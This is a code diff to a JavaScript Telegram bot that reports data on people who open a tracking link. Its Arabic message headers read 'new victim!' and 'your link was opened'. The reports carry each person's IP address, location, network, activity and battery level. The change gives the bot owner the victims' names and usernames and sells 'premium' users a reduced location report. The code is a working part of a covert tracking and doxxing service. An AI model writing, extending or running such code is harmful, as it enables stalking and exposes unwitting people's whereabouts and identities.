@@ -130,20 +130,35 @@ function _flushBuf(tid, ip) {
   const prof = profiles[String(tid)] || {};
   const isTarget = targets.has(tid);
   const flag = isTarget ? '🎯🚨' : '⚠️';
-  let msg = `${flag} *ضحية جديدة!*\n`;
-  if (prof.name) msg += `👤 الاسم: ${prof.name}\n`;
-  if (prof.username) msg += `🔗 اليوزر: @${prof.username}\n`;
-  msg += `🆔 ID: \`${tid}\`\n`;
-  msg += `━━━━━━━━━━━━━━━\n`;
-  if (p.ip)       msg += `⚓ IP: \`${p.ip}\`\n`;
-  if (p.ipInfo)   msg += `${p.ipInfo}\n`;
-  if (p.location) msg += `📍 ${p.location}\n`;
-  if (p.network && p.network !== 'undefined' && p.network !== 'null') msg += `📶 شبكة: ${p.network}\n`;
-  if (p.activity) msg += `🚶 نشاط: ${p.activity}\n`;
-  if (p.battery)  msg += `${p.battery}\n`;
-  msg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
-  bot.sendMessage(tid, msg, {parse_mode:"Markdown"}).catch(()=>{});
-  if (Number(tid) !== BOT_OWNER) bot.sendMessage(BOT_OWNER, msg, {parse_mode:"Markdown"}).catch(()=>{});
+  // Full message (owner only) — includes name/username/ID
+  let ownerMsg = `${flag} *ضحية جديدة!*\n`;
+  if (prof.name)     ownerMsg += `👤 الاسم: ${prof.name}\n`;
+  if (prof.username) ownerMsg += `🔗 اليوزر: @${prof.username}\n`;
+  ownerMsg += `🆔 ID: \`${tid}\`\n`;
+  ownerMsg += `━━━━━━━━━━━━━━━\n`;
+  if (p.ip)       ownerMsg += `⚓ IP: \`${p.ip}\`\n`;
+  if (p.ipInfo)   ownerMsg += `${p.ipInfo}\n`;
+  if (p.location) ownerMsg += `📍 ${p.location}\n`;
+  if (p.network && p.network !== 'undefined' && p.network !== 'null') ownerMsg += `📶 شبكة: ${p.network}\n`;
+  if (p.activity) ownerMsg += `🚶 نشاط: ${p.activity}\n`;
+  if (p.battery)  ownerMsg += `${p.battery}\n`;
+  ownerMsg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
+  // Premium user message — no name/username/ID
+  let premMsg = `${flag} *رابطك فُتح!*\n━━━━━━━━━━━━━━━\n`;
+  if (p.ip)       premMsg += `⚓ IP: \`${p.ip}\`\n`;
+  if (p.ipInfo)   premMsg += `${p.ipInfo}\n`;
+  if (p.location) premMsg += `📍 ${p.location}\n`;
+  if (p.network && p.network !== 'undefined' && p.network !== 'null') premMsg += `📶 شبكة: ${p.network}\n`;
+  if (p.activity) premMsg += `🚶 نشاط: ${p.activity}\n`;
+  if (p.battery)  premMsg += `${p.battery}\n`;
+  premMsg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
+  if (Number(tid) === BOT_OWNER) {
+    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
+  } else {
+    // Owner gets full info; premium user gets only location/network data
+    bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown"}).catch(()=>{});
+    bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
+  }
 }
 
 // ── Live chat sessions ────────────────────────────────────────────────────────
